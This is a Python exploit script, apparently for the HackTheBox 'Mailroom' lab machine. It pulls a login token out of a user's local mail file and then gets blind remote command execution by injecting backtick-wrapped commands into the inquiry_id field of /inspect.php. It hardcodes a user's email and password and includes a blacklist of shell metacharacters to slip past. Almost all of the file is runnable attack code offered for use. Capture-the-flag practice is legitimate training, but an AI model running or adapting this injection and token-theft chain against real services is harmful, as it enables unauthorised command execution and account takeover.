#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-04-21
Description: This script exploits a blind local command injection vulnerability in the Mailroom staff-review-panel application
             by sending a crafted HTTP POST request to /inspect.php endpoint using a valid authentication token. 
             The token is received by sending a login request to /auth.php endpoint and waiting for it to be
             received in the user's mail file in the mailroom host filesystem. 

Usage: python3 script.py "[COMMAND]"
                            - Where COMMAND is a system command to execute

Example: python3 script.py "ping -c2 10.10.10.10"

Pre-requirements:
    - Initial shell on the box.
"""

import requests
from re import findall
from urllib.parse import urlparse, parse_qs
from sys import argv
import json
import pickle
import os
from time import sleep

rhost = "http://staff-review-panel.mailroom.htb"

email = "tristan@mailroom.htb"
password = "69trisRulez!"
mail = "/var/mail/tristan"  # User tristan's local mail file path in mailroom host fs

# Send login token to "tristan" email via login
def send_auth_token(url, email, password):
    data = {'email': email, 'password': password}
    resp = requests.post(url + '/auth.php', data=data)
    if json.loads(resp.text)["success"]:
        print("...",resp.text)
        return True
    else:
        return False

# Extract received token from "/var/mail/tristan"
def extract_token_from_mail(file_path):
    with open(file_path, 'r') as f:
        mail_content = f.read()
    urls = findall(r'http://[a-z0-9.-]+/auth\.php\?token=[a-zA-Z0-9]+', mail_content)
    if urls:
        url = urls[-1]
        print("...", url)
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        token = params['token'][0]
        return token
    else:
        return None

# Command injection black listed chars
def check_blacklist_chars(input_string):
    blacklist = '$<>;|&\{\}()[]\'"'
    for char in blacklist:
        if char in input_string:
            return True
    return False

# Run command injection from "/inspect.php"
def inspect_mailroom(url, cmd, email, password, mail):
    session_file = 'session.pickle'
    if os.path.exists(session_file):
        print("...", session_file, "Found!")
        with open(session_file, 'rb') as f:
            session = pickle.load(f)
    else:
        session = requests.Session()
        print("...", session_file, "Not Found, Creating new session")
        if send_auth_token(url=url, email=email, password=password):
            print("... Waiting for token to be received in the mail")
            sleep(10)
            token = extract_token_from_mail(mail)
            print("[+] New Token:", token)
            session.get(f"{url}/auth.php?token={token}")
        else:
            exit("[!] Login Failed!")

    data = {"inquiry_id": f"`{cmd}`"}
    resp = session.post(f"{url}/inspect.php", data=data, timeout=10)

    if "Inquiry contents parsing failed" not in resp.text:
        print("[!] Command execution failed!")
        return False

    with open(session_file, 'wb') as f:
        pickle.dump(session, f)
    
    print("[+] Command executed in the webapp container.")
    return True

if __name__ == "__main__":

    cmd = ""
    try:
        cmd += argv[1]

        if check_blacklist_chars(cmd):
            exit("[-] Input contains blacklisted characters!")

    except IndexError as e:
        exit("Usage: script.py [COMMAND]")
    
    try:
        inspect_mailroom(url=rhost, cmd=cmd, email=email, password=password, mail=mail)
    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
